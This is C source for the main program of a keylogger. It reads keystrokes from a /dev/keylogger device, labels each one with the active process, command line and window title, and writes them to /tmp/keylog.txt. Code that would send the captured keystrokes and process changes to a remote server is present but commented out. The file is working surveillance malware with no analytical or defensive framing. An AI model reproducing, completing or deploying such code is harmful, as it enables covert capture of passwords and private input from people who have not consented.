#include <stdio.h>
#include <signal.h>
#include <stdbool.h>
#include <unistd.h>
#include "device_client.h"
#include "logger.h"
#include "network_client.h"
#include "keymap.h"
#include "process_tracker.h"

#define MAX_KEYS 10
#define MAX_KEY_LEN 32

static volatile bool running = true;
static char key_buffer[MAX_KEYS][MAX_KEY_LEN];
static int key_count = 0;
static unsigned long last_key_time = 0;
#define KEY_TIMEOUT 1000  // 1 second timeout for key combinations
static struct process_info current_process = {0};

void handle_sigint(int sig) {
    (void)sig;
    running = false;
    printf("\nExiting program...\n");
}

int main(void) {
    char buf[1024];
    signal(SIGINT, handle_sigint);

    // Initialize process tracker
    if (process_tracker_init() < 0) {
        fprintf(stderr, "Failed to initialize process tracker\n");
        return 1;
    }

    // Initialize network client
    // if (network_client_init("config.env") < 0) {
    //     if (network_client_init("user/config.env") < 0) {
    //         fprintf(stderr, "Failed to initialize network client\n");
    //         return 1;
    //     }
    // }

    // Initialize device client
    if (device_client_init("/dev/keylogger") < 0) {
        fprintf(stderr, "Failed to initialize device client\n");
        process_tracker_cleanup();
        // network_client_cleanup();
        return 1;
    }

    if (logger_open("/tmp/keylog.txt") < 0) {
        fprintf(stderr, "Failed to open log file\n");
        device_client_cleanup();
        process_tracker_cleanup();
        // network_client_cleanup();
        return 1;
    }

    printf("Keylogger started. Reading from /dev/keylogger\n");

    // Get initial process info
    if (process_tracker_get_active_process(&current_process) == 0) {
        printf("Initial process: PID=%d, Name=%s, Window=%s\n", 
               current_process.pid, current_process.name, current_process.window_title);
    }

    while (running) {
        // Check if process has changed (check more frequently for better responsiveness)
        static int check_counter = 0;
        check_counter++;
        
        if (check_counter >= 5) {  // Check every 5 iterations instead of 10
            check_counter = 0;
            if (process_tracker_has_changed()) {
                if (process_tracker_get_active_process(&current_process) == 0) {
                    printf("=== PROCESS CHANGE ===\n");
                    printf("New active process: PID=%d, Name=%s\n", 
                           current_process.pid, current_process.name);
                    printf("Command: %s\n", current_process.cmdline);
                    printf("Window: %s\n", current_process.window_title);
                    printf("=====================\n");
                    
                    // Log process change
                    char process_log[2048];
                    snprintf(process_log, sizeof(process_log), 
                            "[PROCESS_CHANGE] PID=%d, Name=%s, Cmd=%s, Window=%s\n",
                            current_process.pid, current_process.name, 
                            current_process.cmdline, current_process.window_title);
                    logger_write(process_log);
                    
                    // Send process change notification to server
                    // if (network_client_send(process_log, strlen(process_log)) < 0) {
                    //     fprintf(stderr, "Failed to send process change to server\n");
                    // }
                }
            }
        }

        int len = device_client_read(buf, sizeof(buf));
        if (len > 0) {
            buf[len] = '\0'; 
            
            // Create metadata with process info
            char output[4096];
            snprintf(output, sizeof(output), 
                    "[KEYSTROKE] PID=%d, Process=%s, Window=%s, Data=%s\n",
                    current_process.pid, current_process.name, 
                    current_process.window_title, buf);
            
            printf("Received: %s", output);
            logger_write(output);

            // send to server
            // if (network_client_send(output, strlen(output)) < 0) {
            //     fprintf(stderr, "Failed to send keys to server\n");
            // }

            fflush(stdout);
        } else if (len == 0) {
            usleep(10000); 
        }
    }
    logger_close();
    device_client_cleanup();
    process_tracker_cleanup();
    // network_client_cleanup();
    return 0;
} 